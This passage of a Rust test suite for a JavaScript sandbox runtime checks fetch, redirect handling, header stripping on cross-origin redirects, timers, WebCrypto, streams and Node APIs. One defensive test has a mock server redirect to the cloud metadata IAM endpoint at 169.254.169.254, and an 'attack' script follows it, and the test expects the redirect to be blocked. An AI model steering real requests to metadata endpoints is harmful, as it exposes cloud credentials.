    let port_b = origin_b.local_addr().unwrap().port();

    // Origin B accepts 1 cross-origin redirected request and verifies `Authorization` was stripped
    let handle_b = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = origin_b.accept() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req_str = String::from_utf8_lossy(&buf[..n]).to_lowercase();
            let leaked_auth = req_str.contains("authorization:");
            let leaked_cookie = req_str.contains("cookie:");
            let body = format!(
                r#"{{"origin":"B","leakedAuth":{},"leakedCookie":{}}}"#,
                leaked_auth, leaked_cookie
            );
            let resp = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(resp.as_bytes());
        }
    });

    // Origin A serves 5 sequential requests over a SINGLE Keep-Alive TcpStream:
    //   Req 1: GET /chunked -> 200 OK with `Transfer-Encoding: chunked`
    //   Req 2: GET /hop1    -> 302 Found -> `/hop2` (same-origin redirect)
    //   Req 3: GET /hop2    -> 200 OK with `Content-Length` (verifies `Authorization` was preserved same-origin)
    //   Req 4: GET /manual  -> 302 Found -> `/hop2` (client uses `redirect: "manual"`)
    //   Req 5: GET /xorigin -> 302 Found -> `http://127.0.0.1:<port_b>/target` (cross-origin redirect)
    //   Req 6: GET /ssrf-redir -> 302 Found -> `http://169.254.169.254/latest/meta-data/iam`
    let handle_a = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = origin_a.accept() {
            let mut buf = [0u8; 4096];
            for _ in 0..6 {
                let n = match stream.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => n,
                };
                let req_str = String::from_utf8_lossy(&buf[..n]);
                let first_line = req_str.lines().next().unwrap_or("");
                if first_line.contains("/chunked") {
                    let resp = concat!(
                        "HTTP/1.1 200 OK\r\n",
                        "Content-Type: text/plain\r\n",
                        "Transfer-Encoding: chunked\r\n",
                        "Connection: keep-alive\r\n\r\n",
                        "5\r\nhello\r\n",
                        "6\r\n-world\r\n",
                        "0\r\n\r\n"
                    );
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/hop1") || first_line.contains("/manual") {
                    let resp = "HTTP/1.1 302 Found\r\nLocation: /hop2\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/hop2") {
                    let has_auth = req_str
                        .to_lowercase()
                        .contains("authorization: bearer same-origin-token");
                    let body = format!(r#"{{"hop2":true,"sameOriginAuth":{}}}"#, has_auth);
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: keep-alive\r\nContent-Length: {}\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/xorigin") {
                    let resp = format!(
                        "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{}/target\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
                        port_b
                    );
                    let _ = stream.write_all(resp.as_bytes());
                } else if first_line.contains("/ssrf-redir") {
                    let resp = "HTTP/1.1 302 Found\r\nLocation: http://169.254.169.254/latest/meta-data/iam\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
                    let _ = stream.write_all(resp.as_bytes());
                }
                let _ = stream.flush();
            }
        }
    });

    let reuse_before_http = crate::outbound_pool_reuse_count();
    let mesh_js = format!(
        r#"
async function runSuite() {{
    const rChunked = await fetch("http://127.0.0.1:{port_a}/chunked");
    const txtChunked = await rChunked.text();

    const rRedir = await fetch("http://127.0.0.1:{port_a}/hop1", {{
        headers: {{ "Authorization": "Bearer same-origin-token" }}
    }});
    const jRedir = await rRedir.json();

    const rManual = await fetch("http://127.0.0.1:{port_a}/manual", {{
        redirect: "manual"
    }});

    const rCross = await fetch("http://127.0.0.1:{port_a}/xorigin", {{
        headers: {{
            "Authorization": "Bearer secret-jwt-token",
            "Cookie": "sid=private-cookie"
        }}
    }});
    const jCross = await rCross.json();

    console.log(JSON.stringify({{
        chunked: txtChunked,
        redirected: rRedir.redirected,
        finalPath: new URL(rRedir.url).pathname,
        sameOriginAuth: jRedir.sameOriginAuth,
        manualStatus: rManual.status,
        manualLocation: rManual.headers.get("location"),
        crossOriginLeakedAuth: jCross.leakedAuth,
        crossOriginLeakedCookie: jCross.leakedCookie
    }}));
}}
runSuite();
"#,
        port_a = port_a
    );
    let mesh_caps = CapabilityToken::pure_compute()
        .with_net_host(format!("127.0.0.1:{}", port_a))
        .with_net_host(format!("127.0.0.1:{}", port_b));
    let mesh_metrics = run_source_isolated(
        "n1-mesh-tenant",
        &mesh_js,
        mesh_caps.clone(),
        4_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    let summary: serde_json::Value = serde_json::from_str(&mesh_metrics.stdout[0]).unwrap();
    assert_eq!(summary["chunked"], "hello-world");
    assert_eq!(summary["redirected"], true);
    assert_eq!(summary["finalPath"], "/hop2");
    assert_eq!(summary["sameOriginAuth"], true);
    assert_eq!(summary["manualStatus"], 302);
    assert_eq!(summary["manualLocation"], "/hop2");
    assert_eq!(summary["crossOriginLeakedAuth"], false);
    assert_eq!(summary["crossOriginLeakedCookie"], false);
    assert!(
        crate::outbound_pool_reuse_count() >= reuse_before_http + 3,
        "Expected Keep-Alive connection reuse across Origin A requests"
    );

    // 3. Verify 302 Redirect to Cloud Metadata IP (`169.254.169.254`) traps immediately!
    let ssrf_redir_js = format!(
        r#"
async function attack() {{
    await fetch("http://127.0.0.1:{}/ssrf-redir");
}}
attack();
"#,
        port_a
    );
    let err_redir = run_source_isolated(
        "n1-mesh-tenant",
        &ssrf_redir_js,
        mesh_caps,
        1_000_000,
        4 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_redir.to_string().contains("SSRF_METADATA_BLOCKED"),
        "Expected SSRF_METADATA_BLOCKED on 302 redirect to 169.254.169.254, got: {}",
        err_redir
    );

    let _ = handle_a.join();
    let _ = handle_b.join();
}

#[test]
fn test_phase_n2_deterministic_time_travel_event_loop_concurrent_fetch_and_abort_signal() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::time::{Duration, Instant};

    SliceIsolate::prewarm_boa_pool(2);

    // 1. Deterministic Time-Travel Event Loop + Microtask/Macrotask Ordering + Async `slice:test` Rollback:
    //    Schedules 66,000 ms (66 seconds!) of exponential backoff timers + `setInterval` + `queueMicrotask`
    //    and verifies that Virtual Time-Warp completes the entire 66-second schedule in < 50ms of wall time!
    crate::reset_virtual_time_warped_ms();
    let start_wall = Instant::now();
    let det_event_loop_ts = r#"
import { describe, test, expect } from "slice:test";

Slice.resetTests();
Slice.kv.set("workflow:state", "initial", 0);

describe("Phase N-2 Deterministic Time-Travel & Event Loop Suite", () => {
    test("orders queueMicrotask, Promise.then, setTimeout, clearTimeout, and setInterval", async () => {
        const events: string[] = [];
        const t0 = Date.now();

        const cancelledId = setTimeout(() => {
            events.push("cancelled-should-not-run");
        }, 5);
        clearTimeout(cancelledId);

        setTimeout((label: string, code: number) => {
            events.push(`${label}:${code}`);
        }, 20, "timer20", 200);

        setTimeout(() => {
            events.push("timer10");
            queueMicrotask(() => events.push("micro-after-timer10"));
        }, 10);

        let ticks = 0;
        const iv = setInterval(() => {
            ticks += 1;
            events.push(`tick:${ticks}`);
            if (ticks >= 3) {
                clearInterval(iv);
            }
        }, 15);

        Promise.resolve().then(() => events.push("promise-1"));
        queueMicrotask(() => events.push("micro-1"));
        events.push("sync-end");

        // Wait 66,000 ms (66 seconds) via exponential backoff timers (warped in 0ns!)
        await new Promise((r) => setTimeout(r, 1000));
        await new Promise((r) => setTimeout(r, 5000));
        await new Promise((r) => setTimeout(r, 60000));

        const elapsedVirtualMs = Date.now() - t0;
        expect(elapsedVirtualMs).toBeGreaterThanOrEqual(66000);
        expect(events.join(",")).toBe(
            "sync-end,promise-1,micro-1,timer10,micro-after-timer10,tick:1,timer20:200,tick:2,tick:3"
        );

        // Mutate KV after async await to verify `slice:test` waits for async completion before rollback
        Slice.kv.set("workflow:state", "mutated-after-66s-await", 0);
        expect(Slice.kv.get("workflow:state")).toBe("mutated-after-66s-await");
    });

    test("sees clean KV state after async test rollback and tests AbortController", async () => {
        expect(Slice.kv.get("workflow:state")).toBe("initial");

        let ctrl = new AbortController();
        let abortEventFired = false;
        ctrl.signal.addEventListener("abort", () => {
            abortEventFired = true;
        });
        setTimeout(() => ctrl.abort(new Error("CustomCancelReason")), 50);

        let caughtMsg = "";
        try {
            await new Promise((_res, rej) => {
                ctrl.signal.addEventListener("abort", () => rej(ctrl.signal.reason));
            });
        } catch (err: any) {
            caughtMsg = String(err.message || err);
        }
        expect(abortEventFired).toBe(true);
        expect(ctrl.signal.aborted).toBe(true);
        expect(caughtMsg).toContain("CustomCancelReason");

        // Also verify pre-aborted AbortSignal.abort() rejects fetch immediately without network I/O
        let preAbortedMsg = "";
        try {
            await fetch("https://example.com/never-dialed", {
                signal: AbortSignal.abort(new Error("PreAbortedSignal"))
            });
        } catch (err2: any) {
            preAbortedMsg = String(err2.message || err2);
        }
        expect(preAbortedMsg).toContain("PreAbortedSignal");
    });
});

console.log(JSON.stringify(Slice.testSummary()));
"#;
    let bundled_det = slice_cas::strip_typescript_and_normalize(det_event_loop_ts, true);
    let bc_det = compile_source_to_bytecode(&bundled_det);
    let mut iso_det = SliceIsolate::spawn(
        "n2-det-event-loop",
        1,
        CapabilityToken::pure_compute().with_net_host("example.com"),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_det.set_deterministic_seed(Some(20261102));
    let det_metrics = iso_det.execute_bytecode(&bc_det, None).unwrap();
    let wall_elapsed = start_wall.elapsed();
    let warped_ms = crate::virtual_time_warped_ms();

    let summary: serde_json::Value = serde_json::from_str(&det_metrics.stdout[0]).unwrap();
    assert_eq!(summary["total"], 2);
    assert_eq!(summary["passed"], 2);
    assert_eq!(summary["failed"], 0, "Test summary: {}", summary);
    assert_eq!(summary["checkpointsRestored"], 2);
    assert!(
        warped_ms >= 66_000,
        "Expected >= 66,000ms of virtual time warp, got {}ms",
        warped_ms
    );
    assert!(
        wall_elapsed < Duration::from_millis(250),
        "66-second deterministic timer suite should finish in < 250ms, took {:?}",
        wall_elapsed
    );

    // 2. True Concurrent `Promise.all([fetch(u1), fetch(u2), fetch(u3), fetch(u4)])` + `AbortSignal.timeout(ms)`:
    //    4 upstream servers each sleep 60ms before responding; sequential execution would take >= 240ms.
    //    A 5th upstream sleeps 350ms and is raced against `AbortSignal.timeout(40)`.
    let mut ports = Vec::new();
    let mut handles = Vec::new();
    for idx in 0..4 {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        ports.push(port);
        handles.push(std::thread::spawn(move || {
            if let Ok((mut stream, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                let _ = stream.read(&mut buf);
                std::thread::sleep(Duration::from_millis(60));
                let body = format!(r#"{{"shard":{},"ok":true}}"#, idx);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
                let _ = stream.flush();
            }
        }));
    }

    let slow_listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let slow_port = slow_listener.local_addr().unwrap().port();
    handles.push(std::thread::spawn(move || {
        if let Ok((mut stream, _)) = slow_listener.accept() {
            let mut buf = [0u8; 1024];
            let _ = stream.read(&mut buf);
            std::thread::sleep(Duration::from_millis(350));
            let _ = stream.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Length: 11\r\nConnection: close\r\n\r\n{\"slow\":true}",
            );
        }
    }));

    let mut caps = CapabilityToken::pure_compute();
    for &p in &ports {
        caps = caps.with_net_host(format!("127.0.0.1:{}", p));
    }
    caps = caps.with_net_host(format!("127.0.0.1:{}", slow_port));

    let fanout_js = format!(
        r#"
async function runFanout() {{
    const responses = await Promise.all([
        fetch("http://127.0.0.1:{}/shard"),
        fetch("http://127.0.0.1:{}/shard"),
        fetch("http://127.0.0.1:{}/shard"),
        fetch("http://127.0.0.1:{}/shard"),
    ]);
    const payloads = await Promise.all(responses.map((r) => r.json()));
    const shards = payloads.map((p) => p.shard);

    let timeoutAborted = false;
    let timeoutError = "";
    try {{
        await fetch("http://127.0.0.1:{}/slow", {{
            signal: AbortSignal.timeout(35)
        }});
    }} catch (err) {{
        timeoutAborted = true;
        timeoutError = String(err && err.message || err);
    }}

    console.log(JSON.stringify({{
        shards,
        timeoutAborted,
        isTimeoutErr: timeoutError.indexOf("TimeoutError") !== -1
    }}));
}}
runFanout();
"#,
        ports[0], ports[1], ports[2], ports[3], slow_port
    );

    let fanout_start = Instant::now();
    let fanout_metrics = run_source_isolated(
        "n2-fanout-tenant",
        &fanout_js,
        caps,
        5_000_000,
        8 * 1024 * 1024,
    )
    .unwrap();
    let fanout_elapsed = fanout_start.elapsed();
    let fanout_out: serde_json::Value = serde_json::from_str(&fanout_metrics.stdout[0]).unwrap();
    assert_eq!(fanout_out["shards"], serde_json::json!([0, 1, 2, 3]));
    assert_eq!(fanout_out["timeoutAborted"], true);
    assert_eq!(fanout_out["isTimeoutErr"], true);
    assert!(
        fanout_elapsed < Duration::from_millis(220),
        "Expected 4x60ms parallel fan-out + 35ms timeout to complete in < 220ms, took {:?}",
        fanout_elapsed
    );

    // 3. Verify un-cleared infinite `setInterval` is bounded and trapped by `MAX_EVENT_LOOP_TICKS`
    let runaway_interval_js = r#"
setInterval(() => {
    // Runaway interval that never calls clearInterval
}, 1);
"#;
    let mut iso_runaway = SliceIsolate::spawn(
        "n2-runaway-interval",
        2,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    iso_runaway.set_deterministic_seed(Some(99));
    let runaway_bc = compile_source_to_bytecode(runaway_interval_js);
    let runaway_res = iso_runaway.execute_bytecode(&runaway_bc, None);
    assert!(matches!(
        runaway_res,
        Err(SandboxViolation::CpuFuelExhausted { .. })
    ));

    for h in handles {
        let _ = h.join();
    }
}

#[test]
fn test_phase_n3_wintertc_encoding_webcrypto_streams_and_cloning() {
    let script = r#"
(async function() {
    // 1. TextEncoder / TextDecoder / btoa / atob
    const enc = new TextEncoder();
    const dec = new TextDecoder("utf-8", { fatal: true });
    const bytes = enc.encode("Slice-UTF8-\u00e9-\u20ac");
    const decoded = dec.decode(bytes);

    // encodeInto with partial buffer capacity (multi-byte euro sign \u20ac is 3 UTF-8 bytes)
    const dest = new Uint8Array(5);
    const intoRes = enc.encodeInto("ab\u20accd", dest); // 'a' (1) + 'b' (1) + '\u20ac' (3) = 5 bytes, 3 UTF-16 units
    const intoDecoded = dec.decode(dest.subarray(0, intoRes.written));

    // Fatal UTF-8 decoder must throw TypeError on invalid 0xFF byte
    let fatalThrew = false;
    try {
        dec.decode(new Uint8Array([0xff, 0xfe]));
    } catch (e) {
        fatalThrew = e instanceof TypeError;
    }

    // btoa / atob round-trip & InvalidCharacterError on non-Latin1
    const b64 = btoa("WinterTC:Edge:2026");
    const unb64 = atob(b64);
    let btoaNonLatin1Threw = false;
    try {
        btoa("\u20ac");
    } catch (_e) {
        btoaNonLatin1Threw = true;
    }

    // 2. Deterministic WebCrypto: randomUUID, getRandomValues, digest, HMAC sign/verify, JWK
    const uuid1 = crypto.randomUUID();
    const rndBuf = new Uint8Array(16);
    crypto.getRandomValues(rndBuf);
    let quotaThrew = false;
    try {
        crypto.getRandomValues(new Uint8Array(65537));
    } catch (e) {
        quotaThrew = String(e.message || e).indexOf("QuotaExceededError") !== -1;
    }

    function bufToHex(ab) {
        const u8 = new Uint8Array(ab);
        let s = "";
        for (let i = 0; i < u8.length; i++) {
            const h = u8[i].toString(16);
            s += h.length === 1 ? "0" + h : h;
        }
        return s;
    }

    const abcBytes = enc.encode("abc");
    const sha1Hex = bufToHex(await crypto.subtle.digest("SHA-1", abcBytes));
    const sha256Hex = bufToHex(await crypto.subtle.digest("SHA-256", abcBytes));
    const sha384Hex = bufToHex(await crypto.subtle.digest("SHA-384", abcBytes));
    const sha512Hex = bufToHex(await crypto.subtle.digest("SHA-512", abcBytes));

    const hmacKey = await crypto.subtle.importKey(
        "raw",
        enc.encode("slice-wintertc-hmac-secret-key"),
        { name: "HMAC", hash: "SHA-256" },
        true,
        ["sign", "verify"]
    );
    const jwkExported = await crypto.subtle.exportKey("jwk", hmacKey);
    const jwkImported = await crypto.subtle.importKey(
        "jwk",
        jwkExported,
        { name: "HMAC", hash: "SHA-256" },
        false,
        ["verify"]
    );
    const payloadBytes = enc.encode("header.payload.claims");
    const sigBuf = await crypto.subtle.sign("HMAC", hmacKey, payloadBytes);
    const verifiedOk = await crypto.subtle.verify("HMAC", jwkImported, sigBuf, payloadBytes);
    const tamperedBytes = enc.encode("header.payload.tampered");
    const verifiedTampered = await crypto.subtle.verify("HMAC", jwkImported, sigBuf, tamperedBytes);
    const timingEq = crypto.subtle.timingSafeEqual(new Uint8Array(sigBuf), new Uint8Array(sigBuf));

    // 3. Event, CustomEvent, EventTarget, and AbortSignal.any
    const et = new EventTarget();
    const eventsLog = [];
    const acListener = new AbortController();
    et.addEventListener("custom", (ev) => {
        eventsLog.push("once:" + ev.detail.tag);
    }, { once: true });
    et.addEventListener("custom", (ev) => {
        eventsLog.push("sig:" + ev.detail.tag);
    }, { signal: acListener.signal });
    et.dispatchEvent(new CustomEvent("custom", { detail: { tag: "first" } }));
    acListener.abort("unsubscribed");
    et.dispatchEvent(new CustomEvent("custom", { detail: { tag: "second" } }));

    const ac1 = new AbortController();
    const ac2 = new AbortController();
    const combinedSig = AbortSignal.any([ac1.signal, ac2.signal]);
    let combinedAbortedReason = "";
    combinedSig.addEventListener("abort", () => {
        combinedAbortedReason = String(combinedSig.reason);
    });
    ac2.abort("ac2-triggered");

    // 4. Blob, File, FormData, Request/Response binary bodies, and structuredClone
    const blob = new Blob(["Hello ", enc.encode("World")], { type: "text/plain" });
    const file = new File([blob, "!"], "greeting.txt", { type: "text/plain", lastModified: 1700000000123 });
    const fileText = await file.text();
    const slicedBlobText = await file.slice(0, 5).text();

    const fd = new FormData();
    fd.append("project", "slice");
    fd.append("artifact", file);
    const reqBin = new Request("https://edge.slice.dev/upload", {
        method: "POST",
        body: new Uint8Array([10, 20, 30, 40])
    });
    const reqAb = await reqBin.arrayBuffer();
    const reqU8 = new Uint8Array(reqAb);

    const cyclic = { name: "root", tags: new Set(["a", "b"]), meta: new Map([["k", 42]]), buf: new Uint8Array([7, 8, 9]) };
    cyclic.self = cyclic;
    const cloned = structuredClone(cyclic);
    cloned.buf[0] = 99;
    const clonePreservedCycle = (cloned.self === cloned) && (cloned !== cyclic) && (cyclic.buf[0] === 7) && (cloned.meta.get("k") === 42);

    // 5. ReadableStream, WritableStream, TransformStream, TextEncoderStream, TextDecoderStream
    const upperTransform = new TransformStream({
        transform(chunk, controller) {
            controller.enqueue(String(chunk).toUpperCase());
        }
    });
    const streamChunks = [];
    const sink = new WritableStream({
        write(chunk) {
            streamChunks.push(chunk);
        }
    });
    await ReadableStream.from(["alpha-", "beta-", "gamma"])
        .pipeThrough(upperTransform)
        .pipeThrough(new TextEncoderStream())
        .pipeThrough(new TextDecoderStream())
        .pipeTo(sink);

    console.log(JSON.stringify({
        decoded,
        intoRead: intoRes.read,
        intoWritten: intoRes.written,
        intoDecoded,
        fatalThrew,
        unb64,
        btoaNonLatin1Threw,
        uuid1,
        rndFirst4: [rndBuf[0], rndBuf[1], rndBuf[2], rndBuf[3]],
        quotaThrew,
        sha1Hex,
        sha256Hex,
        sha384Prefix: sha384Hex.slice(0, 16),
        sha512Prefix: sha512Hex.slice(0, 16),
        verifiedOk,
        verifiedTampered,
        timingEq,
        eventsLog,
        combinedAborted: combinedSig.aborted,
        combinedAbortedReason,
        fileSize: file.size,
        fileName: file.name,
        fileText,
        slicedBlobText,
        fdProject: fd.get("project"),
        fdFileName: fd.get("artifact").name,
        reqBytes: [reqU8[0], reqU8[1], reqU8[2], reqU8[3]],
        clonePreservedCycle,
        streamJoined: streamChunks.join("")
    }));
})();
"#;

    let bc = compile_source_to_bytecode(script);

    // Execute twice in deterministic mode with identical seed to verify deterministic WebCrypto replay!
    let mut iso1 = SliceIsolate::spawn(
        "n3-tenant-1",
        1,
        CapabilityToken::pure_compute(),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso1.set_deterministic_seed(Some(20261102));
    let m1 = iso1.execute_bytecode(&bc, None).unwrap();

    let mut iso2 = SliceIsolate::spawn(
        "n3-tenant-2",
        2,
        CapabilityToken::pure_compute(),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso2.set_deterministic_seed(Some(20261102));
    let m2 = iso2.execute_bytecode(&bc, None).unwrap();

    assert_eq!(
        m1.stdout[0], m2.stdout[0],
        "Expected deterministic WebCrypto UUIDv4 and getRandomValues to replay identically"
    );

    let out: serde_json::Value = serde_json::from_str(&m1.stdout[0]).unwrap();
    assert_eq!(out["decoded"], "Slice-UTF8-\u{00e9}-\u{20ac}");
    assert_eq!(out["intoRead"], 3);
    assert_eq!(out["intoWritten"], 5);
    assert_eq!(out["intoDecoded"], "ab\u{20ac}");
    assert_eq!(out["fatalThrew"], true);
    assert_eq!(out["unb64"], "WinterTC:Edge:2026");
    assert_eq!(out["btoaNonLatin1Threw"], true);
    assert_eq!(out["quotaThrew"], true);
    // NIST FIPS 180-4 test vectors for "abc"
    assert_eq!(out["sha1Hex"], "a9993e364706816aba3e25717850c26c9cd0d89d");
    assert_eq!(
        out["sha256Hex"],
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert_eq!(out["sha384Prefix"], "cb00753f45a35e8b");
    assert_eq!(out["sha512Prefix"], "ddaf35a193617aba");
    assert_eq!(out["verifiedOk"], true);
    assert_eq!(out["verifiedTampered"], false);
    assert_eq!(out["timingEq"], true);
    assert_eq!(
        out["eventsLog"],
        serde_json::json!(["once:first", "sig:first"])
    );
    assert_eq!(out["combinedAborted"], true);
    assert_eq!(out["combinedAbortedReason"], "ac2-triggered");
    assert_eq!(out["fileSize"], 12);
    assert_eq!(out["fileName"], "greeting.txt");
    assert_eq!(out["fileText"], "Hello World!");
    assert_eq!(out["slicedBlobText"], "Hello");
    assert_eq!(out["fdProject"], "slice");
    assert_eq!(out["fdFileName"], "greeting.txt");
    assert_eq!(out["reqBytes"], serde_json::json!([10, 20, 30, 40]));
    assert_eq!(out["clonePreservedCycle"], true);
    assert_eq!(out["streamJoined"], "ALPHA-BETA-GAMMA");
}

#[test]
fn test_phase_n4_uint8array_buffer_and_node_core_tier1() {
    let script = r#"
import { EventEmitter } from "node:events";
import * as path from "node:path";
import * as crypto from "node:crypto";
import * as fs from "node:fs";
import * as fsp from "node:fs/promises";
import assert from "node:assert";
import * as util from "node:util";

async function main() {
    // 1. Real Uint8Array-backed Buffer & binary wire-protocol methods
    const b1 = Buffer.from("Slice\u20ac", "utf8");
    assert.strictEqual(Buffer.isBuffer(b1), true);
    assert.strictEqual(b1 instanceof Uint8Array, true);
    assert.strictEqual(b1 instanceof Buffer, true);
    assert.strictEqual(b1.length, 8);
    assert.strictEqual(Buffer.byteLength("Slice\u20ac", "utf8"), 8);

    const hexStr = b1.toString("hex");
    const bFromHex = Buffer.from(hexStr, "hex");
    assert.strictEqual(b1.equals(bFromHex), true);
    assert.strictEqual(bFromHex.toString("utf8"), "Slice\u20ac");

    const b64u = b1.toString("base64url");
    assert.strictEqual(Buffer.from(b64u, "base64url").toString("utf8"), "Slice\u20ac");

    // Shared memory view on slice / subarray & binary integer readers/writers
    const wire = Buffer.alloc(16);
    wire.writeUInt32BE(0xdeadbeef, 0);
    wire.writeUInt32LE(0x12345678, 4);
    wire.writeBigUInt64BE(0x0102030405060708n, 8);
    assert.strictEqual(wire.readUInt32BE(0), 0xdeadbeef);
    assert.strictEqual(wire.readUInt32LE(4), 0x12345678);
    assert.strictEqual(wire.readBigUInt64BE(8), 0x0102030405060708n);

    const sub = wire.slice(0, 4);
    sub[0] = 0xca;
    assert.strictEqual(wire[0], 0xca);

    const cat = Buffer.concat([Buffer.from("AB"), Buffer.from("CD")]);
    assert.strictEqual(cat.toString("utf8"), "ABCD");

    // 2. node:events EventEmitter
    const bus = new EventEmitter();
    const evLog: string[] = [];
    bus.on("packet", (id: number) => evLog.push(`on:${id}`));
    bus.once("packet", (id: number) => evLog.push(`once:${id}`));
    bus.prependListener("packet", (id: number) => evLog.push(`pre:${id}`));
    bus.emit("packet", 1);
    bus.emit("packet", 2);
    assert.deepStrictEqual(evLog, ["pre:1", "on:1", "once:1", "pre:2", "on:2"]);

    // 3. node:path
    const norm = path.normalize("/a/b/../c/./d//file.tar.gz");
    const rel = path.relative("/a/c/x", "/a/c/d/file.tar.gz");
    const parsed = path.parse(norm);
    const formatted = path.format(parsed);
    assert.strictEqual(norm, "/a/c/d/file.tar.gz");
    assert.strictEqual(rel, "../d/file.tar.gz");
    assert.strictEqual(parsed.base, "file.tar.gz");
    assert.strictEqual(parsed.name, "file.tar");
    assert.strictEqual(parsed.ext, ".gz");
    assert.strictEqual(formatted, "/a/c/d/file.tar.gz");

    // 4. node:crypto streaming multi-chunk Hash/HMAC + randomBytes
    const rb = crypto.randomBytes(12);
    assert.strictEqual(Buffer.isBuffer(rb), true);
    assert.strictEqual(rb.length, 12);

    const h512 = crypto.createHash("sha512")
        .update(Buffer.from("ab"))
        .update("c")
        .digest();
    assert.strictEqual(Buffer.isBuffer(h512), true);
    assert.strictEqual(h512.length, 64);
    assert.strictEqual(h512.toString("hex").slice(0, 16), "ddaf35a193617aba");

    const hmacBuf = crypto.createHmac("sha256", Buffer.from("secret-key"))
        .update("part1:")
        .update(Buffer.from("part2"))
        .digest();
    assert.strictEqual(Buffer.isBuffer(hmacBuf), true);
    assert.strictEqual(hmacBuf.length, 32);

    // 5. node:fs & node:fs/promises + Time-Travel VFS checkpoint
    const snap = Slice.checkpoint();
    await fsp.mkdir("/tmp/n4_dir");
    await fsp.writeFile("/tmp/n4_dir/a.txt", Buffer.from("payload-v1"));
    fs.copyFileSync("/tmp/n4_dir/a.txt", "/tmp/n4_dir/b.txt");
    fs.renameSync("/tmp/n4_dir/b.txt", "/tmp/n4_dir/c.txt");
    const stFile = await fsp.stat("/tmp/n4_dir/c.txt");
    const stDir = await fsp.stat("/tmp/n4_dir");
    const rawBuf = await fsp.readFile("/tmp/n4_dir/c.txt", null);
    assert.strictEqual(Buffer.isBuffer(rawBuf), true);
    assert.strictEqual(rawBuf.toString("utf8"), "payload-v1");
    assert.strictEqual(stFile.isFile(), true);
    assert.strictEqual(stDir.isDirectory(), true);
    Slice.restore(snap);
    assert.strictEqual(fs.existsSync("/tmp/n4_dir/c.txt"), false);

    // 6. node:util & node:assert
    const formattedMsg = util.format("route=%s code=%d ok=%j %%", "/api", 200, { v: 1 });
    assert.strictEqual(formattedMsg, "route=/api code=200 ok={\"v\":1} %");
    assert.strictEqual(util.types.isBuffer(b1), true);
    assert.strictEqual(util.types.isUint8Array(b1), true);

    const asyncAdd = util.promisify((x: number, y: number, cb: (err: any, r?: number) => void) => {
        cb(null, x + y);
    });
    const sum = await asyncAdd(19, 23);
    assert.strictEqual(sum, 42);

    assert.throws(() => {
        throw new RangeError("out of bounds");
    }, /out of bounds/);

    console.log(JSON.stringify({
        ok: true,
        hexStr,
        randHex: rb.toString("hex"),
        sha512Prefix: h512.toString("hex").slice(0, 16),
        hmacHex: hmacBuf.toString("hex").slice(0, 16),
        rel,
        sum
    }));
}
main();
"#;

    let bc = compile_source_to_bytecode(script);
    let mut iso1 = SliceIsolate::spawn(
        "phase-n4-tenant-1",
        1,
        CapabilityToken::pure_compute(),
        25_000_000,
        8 * 1024 * 1024,
    );
    iso1.set_deterministic_seed(Some(20261104));
    let m1 = iso1.execute_bytecode(&bc, None).unwrap();

    let mut iso2 = SliceIsolate::spawn(
        "phase-n4-tenant-2",
        2,
        CapabilityToken::pure_compute(),
        25_000_000,
        8 * 1024 * 1024,
    );
    iso2.set_deterministic_seed(Some(20261104));
    let m2 = iso2.execute_bytecode(&bc, None).unwrap();

    assert_eq!(m1.stdout[0], m2.stdout[0]);
    let out: serde_json::Value = serde_json::from_str(&m1.stdout[0]).expect(&m1.stdout[0]);
    assert_eq!(out["ok"], true);
    assert_eq!(out["hexStr"], "536c696365e282ac");
    assert_eq!(out["sha512Prefix"], "ddaf35a193617aba");
    assert_eq!(out["rel"], "../d/file.tar.gz");
    assert_eq!(out["sum"], 42);
}

#[test]
fn test_wave_a_next_tick_set_immediate_timers_promises_full_console_and_jsx_ssr() {
    // 1. Verify strict task/microtask priority ordering:
    //    sync -> process.nextTick -> Promise.then / queueMicrotask -> setImmediate -> setTimeout(0)
    //    plus `clearImmediate` cancellation and `node:timers/promises` with virtual time-warp & AbortSignal.
    let async_order_ts = r#"
import * as timersPromises from "node:timers/promises";

async function runSuite() {
    const order: string[] = [];

    setTimeout(() => order.push("timeout-0"), 0);
    const cancelledImm = setImmediate(() => order.push("cancelled-immediate"));
    clearImmediate(cancelledImm);
    setImmediate((tag: string) => order.push(`immediate:${tag}`), "check");
    Promise.resolve().then(() => order.push("promise-then"));
    queueMicrotask(() => {
        order.push("queue-microtask");
        process.nextTick(() => order.push("nested-nextTick"));
    });
    process.nextTick((a: string, b: number) => order.push(`nextTick:${a}:${b}`), "hi", 1);
    order.push("sync");

    const delayedVal = await timersPromises.setTimeout(250, "warped-250ms");
    const immVal = await timersPromises.setImmediate("imm-resolved");

    let abortCaught = "";
    try {
        await timersPromises.setTimeout(5000, "never", {
